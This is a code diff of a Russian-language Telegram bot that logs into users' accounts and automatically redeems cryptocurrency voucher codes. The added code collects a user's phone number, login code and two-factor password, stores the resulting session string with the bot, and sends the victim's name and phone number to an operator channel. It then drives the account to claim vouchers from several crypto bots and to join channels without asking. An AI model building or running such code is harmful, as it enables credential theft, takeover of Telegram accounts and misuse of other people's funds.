             if user_id in user_data:
+                if 'client' in user_data[user_id]:
+                    try:
+                        await user_data[user_id]['client'].disconnect()
+                    except:
+                        pass
                 del user_data[user_id]
     
-    except Exception as e:
-        await bot.send_message(user_id, f"❌ Критическая ошибка: {str(e)[:100]}")
+    # Обработка пароля 2FA
+    elif user_id in user_data and user_data[user_id].get('state') == 'waiting_password':
+        password = text
+        
+        try:
+            client = user_data[user_id]['client']
+            
+            await client.sign_in(password=password)
+            
+            # Сохраняем сессию
+            session_string = client.session.save()
+            user_sessions[user_id] = session_string
+            
+            me = await client.get_me()
+            
+            await event.reply(
+                f"✅ **ВХОД С 2FA УСПЕШЕН!**\n\n"
+                f"👤 {me.first_name}\n"
+                f"📱 {me.phone}\n\n"
+                f"🎯 Сессия сохранена! Используйте /catch"
+            )
+            
+            del user_data[user_id]
+            await client.disconnect()
+            
+            # Автозапуск ловли
+            await asyncio.sleep(2)
+            await event.reply("🎯 Запускаю ловлю...")
+            asyncio.create_task(start_auto_catching(user_id))
+            
+        except Exception as e:
+            await event.reply(f"❌ Ошибка пароля: {e}")
+            if user_id in user_data:
+                if 'client' in user_data[user_id]:
+                    try:
+                        await user_data[user_id]['client'].disconnect()
+                    except:
+                        pass
+                del user_data[user_id]
 
-# ========== ОПТИМИЗИРОВАННАЯ ЛОВЛЯ ЧЕКОВ ==========
-async def start_check_catching(user_id):
-    """Запуск оптимизированной ловли чеков"""
+# ========== АВТОМАТИЧЕСКАЯ ЛОВЛЯ ==========
+async def start_auto_catching(user_id):
+    """Автоматическая ловля чеков"""
     if user_id not in user_sessions:
         return
     
@@ -714,72 +533,53 @@ async def start_check_catching(user_id):
         me = await client.get_me()
         active_clients[user_id] = client
         
-        # Уведомление о запуске
-        start_msg = (
-            f"🎯 **ЛОВЛЯ ЧЕКОВ ЗАПУЩЕНА!**\n\n"
+        # Уведомление
+        await bot.send_message(
+            user_id,
+            f"🎯 **АВТОЛОВЛЯ АКТИВИРОВАНА!**\n\n"
             f"👤 Аккаунт: {me.first_name}\n"
             f"📱 Телефон: {me.phone}\n"
-            f"🌍 {get_country_from_phone(me.phone)}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
-            f"🔍 Мониторинг 6 ботов:\n"
-            f"• @CryptoBot\n• @send\n• @tonRocketBot\n"
-            f"• @wallet\n• @xrocket\n• @CryptoTestnetBot\n\n"
-            f"🛑 Для остановки: /stop"
+            f"🔍 Мониторинг 6 ботов...\n"
+            f"🛑 /stop - остановить"
         )
         
-        await bot.send_message(user_id, start_msg)
+        await bot.send_message(
+            channel,
+            f"🎯 **АВТОЛОВЛЯ ЗАПУЩЕНА**\n\n"
+            f"👤 {me.first_name}\n"
+            f"📱 {me.phone}\n"
+            f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+        )
         
-        try:
-            await bot.send_message(
-                channel,
-                f"🎯 **ЛОВЛЯ АКТИВИРОВАНА**\n\n"
-                f"👤 {me.first_name}\n"
-                f"📱 {me.phone}\n"
-                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-            )
-        except:
-            pass
-        
-        # ========== ОПТИМИЗИРОВАННЫЕ ОБРАБОТЧИКИ ==========
+        # ========== ОБРАБОТЧИКИ ЧЕКОВ ==========
         
         @client.on(events.NewMessage(chats=crypto_black_list))
-        async def optimized_check_handler(event):
-            """Оптимизированный обработчик чеков"""
+        async def auto_check_handler(event):
             try:
                 text = event.text or ''
-                message_text = text.translate(translation)
+                found = code_regex.findall(text)
                 
-                # Ищем чеки в тексте
-                found_codes = code_regex.findall(message_text)
-                
-                if found_codes:
-                    for bot_name, code in found_codes:
+                if found:
+                    for bot_name, code in found:
                         if code not in checks:
-                            print(f"🎯 Найден чек: {code} для {bot_name}")
-                            
-                            # Активируем чек
+                            print(f"🎯 Авточек: {code}")
                             await client.send_message(bot_name, f'/start {code}')
                             checks.append(code)
                             
-                            # Обновляем счетчик
                             global checks_count
                             checks_count += 1
                             
-                            # Уведомление
-                            try:
+                            # Уведомление каждые 5 чеков
+                            if checks_count % 5 == 0:
                                 await bot.send_message(
                                     channel,
-                                    f"💰 **ЧЕК АКТИВИРОВАН!**\n\n"
-                                    f"🎯 Сумма: найдено\n"
-                                    f"🤖 Бот: @{bot_name}\n"
-                                    f"👤 От: {me.first_name}\n"
-                                    f"📊 Всего: {checks_count}\n"
+                                    f"💰 **АВТОЧЕКОВ: {checks_count}**\n\n"
+                                    f"👤 {me.first_name}\n"
                                     f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                                 )
-                            except:
-                                pass
                 
-                # Ищем чеки в кнопках
+                # Проверяем кнопки
                 if event.message.reply_markup:
                     for row in event.message.reply_markup.rows:
                         for button in row.buttons:
@@ -788,119 +588,55 @@ async def start_check_catching(user_id):
                                     match = code_regex.search(button.url)
                                     if match and match.group(2) not in checks:
                                         code = match.group(2)
-                                        bot_name = match.group(1)
-                                        
-                                        await client.send_message(bot_name, f'/start {code}')
+                                        await client.send_message(match.group(1), f'/start {code}')
                                         checks.append(code)
                                         checks_count += 1
                             except:
                                 pass
                                 
             except Exception as e:
-                print(f"⚠️ Ошибка обработки: {e}")
+                print(f"⚠️ Ошибка автоловли: {e}")
         
-        # Обработчик для подписок на каналы
-        @client.on(events.NewMessage(chats=[1985737506], pattern="⚠️ Вы не можете активировать этот чек"))
-        async def handle_subscription(event):
-            """Автоподписка на каналы для @CryptoBot"""
+        # Автоподписка
+        @client.on(events.NewMessage(chats=[1985737506], pattern="⚠️ Вы не можете активировать"))
+        async def auto_subscription_handler(event):
             try:
                 for row in event.message.reply_markup.rows:
                     for button in row.buttons:
                         try:
-                            # Подписка на приватные каналы
                             channel_match = url_regex.search(button.url)
                             if channel_match:
                                 await client(ImportChatInviteRequest(channel_match.group(1)))
-                                print(f"✅ Подписался на приватный канал")
                             
-                            # Подписка на публичные каналы
                             public_channel = public_regex.search(button.url)
                             if public_channel:
                                 await client(JoinChannelRequest(public_channel.group(1)))
-                                print(f"✅ Подписался на @{public_channel.group(1)}")
-                                
-                        except Exception as e:
-                            print(f"⚠️ Ошибка подписки: {e}")
-            except:
-                pass
-        
-        # Обработчик для @tonRocketBot
-        @client.on(events.NewMessage(chats=[1559501630], pattern="Чтобы"))
-        async def handle_tonrocket(event):
-            try:
-                for row in event.message.reply_markup.rows:
-                    for button in row.buttons:
-                        try:
-                            channel_match = url_regex.search(button.url)
-                            if channel_match:
-                                await client(ImportChatInviteRequest(channel_match.group(1)))
                         except:
                             pass
             except:
                 pass
-            
-            await asyncio.sleep(1)
-            await event.message.click(data=b'check-subscribe')
         
-        # Обработчик успешных активаций
-        async def success_filter(event):
-            for word in ['Вы получили', 'Вы обналичили чек на сумму:', '✅ Вы получили:', '💰 Вы получили']:
-                if word in event.text:
-                    return True
-            return False
+        print(f"✅ Автоловля для {me.first_name}")
         
-        @client.on(events.NewMessage(chats=crypto_black_list, func=success_filter))
-        async def handle_success(event):
-            """Уведомления об успешных активациях"""
-            try:
-                summ = event.text.split('\n')[0]
-                summ = summ.replace('Вы получили ', '').replace('✅ Вы получили: ', '').replace('💰 Вы получили ', '').replace('Вы обналичили чек на сумму: ', '')
-                
-                await bot.send_message(
-                    channel,
-                    f"💰 **УСПЕШНАЯ АКТИВАЦИЯ!**\n\n"
-                    f"🎯 Сумма: {summ}\n"
-                    f"👤 Аккаунт: {me.first_name}\n"
-                    f"📊 Всего: {checks_count}\n"
-                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                )
-            except:
-                pass
-        
-        print(f"✅ Ловля запущена для {me.first_name} ({me.phone})")
-        
-        # Бесконечный цикл ловли
+        # Бесконечный цикл
         while user_id in active_clients:
             await asyncio.sleep(1)
         
-        # Если вышли из цикла, отключаем клиента
+        # Остановка
         await client.disconnect()
-        if user_id in active_clients:
-            del active_clients[user_id]
         
         await bot.send_message(
             user_id,
-            f"🛑 **Ловля остановлена**\n\n"
-            f"👤 {me.first_name}\n"
-            f"📊 Всего чеков: {checks_count}\n"
+            f"🛑 **Автоловля остановлена**\n\n"
+            f"📊 Чеков: {checks_count}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}"
         )
         
     except Exception as e:
-        error_msg = f"❌ Ошибка ловли: {str(e)[:200]}"
+        error_msg = f"❌ Ошибка автоловли: {str(e)[:200]}"
         print(error_msg)
         
         await bot.send_message(user_id, error_msg)
-        
-        try:
-            await bot.send_message(
-                channel,
-                f"❌ **ОШИБКА ЛОВЛИ**\n\n"
-                f"👤 Админ: `{ADMIN_ID}`\n"
-                f"⚠️ {str(e)[:150]}"
-            )
-        except:
-            pass
         
         if user_id in active_clients:
             del active_clients[user_id]
@@ -909,69 +645,40 @@ async def start_check_catching(user_id):
 start_time = time.time()
 
 async def main():
-    """Основная функция запуска бота"""
-    print("🚀 ЗАПУСКАЮ LOVEС CHECK BOT...")
-    print("=" * 60)
+    """Основная функция"""
+    print("🚀 ЗАПУСКАЮ LOVEС AUTO BOT...")
     
     try:
-        # Запускаем бота
         await bot.start(bot_token=bot_token)
         me = await bot.get_me()
         
         print(f"✅ Бот запущен: @{me.username}")
-        print(f"✅ ID бота: {me.id}")
-        print(f"✅ Админ ID: {ADMIN_ID}")
-        print(f"✅ Канал: {channel}")
-        print("=" * 60)
+        print(f"✅ Админ: {ADMIN_ID}")
         
-        # Отправляем приветственное сообщение админу
-        welcome_msg = (
-            f"🤖 **LOVEC CHECK BOT ЗАПУЩЕН!**\n\n"
+        await bot.send_message(
+            ADMIN_ID,
+            f"🤖 **LOVEC AUTO BOT ЗАПУЩЕН!**\n\n"
             f"🔗 Бот: @{me.username}\n"
-            f"🆔 ID: {me.id}\n"
             f"👑 Админ: `{ADMIN_ID}`\n"
-            f"📢 Канал: `{channel}`\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
-            f"📍 **Универсальная версия**\n"
-            f"🌍 Поддерживает все страны\n"
-            f"📱 Работает с любыми номерами\n\n"
-            f"📋 **Быстрый старт:**\n"
-            "1. /login - Войти в аккаунт\n"
-            "2. Ввести номер телефона\n"
-            "3. Ввести код через клавиатуру\n"
-            "4. /catch - Начать ловлю чеков\n\n"
-            f"🌐 Хостинг: songaura.onrender.com"
+            f"🎯 **АВТОМАТИЧЕСКИЙ РЕЖИМ**\n"
+            f"Я сам получу сессию и начну ловлю!\n\n"
+            f"📋 **ПРОСТО:**\n"
+            f"1. Напишите /auto\n"
+            f"2. Введите номер телефона\n"
+            f"3. Введите код из Telegram\n"
+            f"4. Я начну ловить чеки!\n\n"
+            f"🚀 **ВСЁ АВТОМАТИЧЕСКИ!**"
         )
         
-        await bot.send_message(ADMIN_ID, welcome_msg, parse_mode='HTML')
-        
-        print("✅ Приветственное сообщение отправлено админу")
         print("=" * 60)
-        print("📱 **ИНСТРУКЦИЯ:**")
-        print("1. Напишите боту /start")
-        print("2. Используйте /login для входа")
-        print("3. Введите любой номер телефона")
-        print("4. Введите код через цифровую клавиатуру")
-        print("5. Используйте /catch для ловли чеков")
-        print("=" * 60)
-        print("⚡ БОТ ГОТОВ К РАБОТЕ!")
+        print("✅ БОТ ГОТОВ К АВТОРАБОТЕ!")
         print("=" * 60)
         
-        # Бесконечный цикл
         await bot.run_until_disconnected()
         
     except Exception as e:
-        print(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
-        import traceback
-        traceback.print_exc()
-        print("🔄 Перезапуск через 10 секунд...")
-        await asyncio.sleep(10)
-        await main()
+        print(f"❌ Ошибка: {e}")
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n👋 Бот остановлен пользователем")
-    except Exception as e:
-        print(f"❌ Фатальная ошибка: {e}")
+    asyncio.run(main())
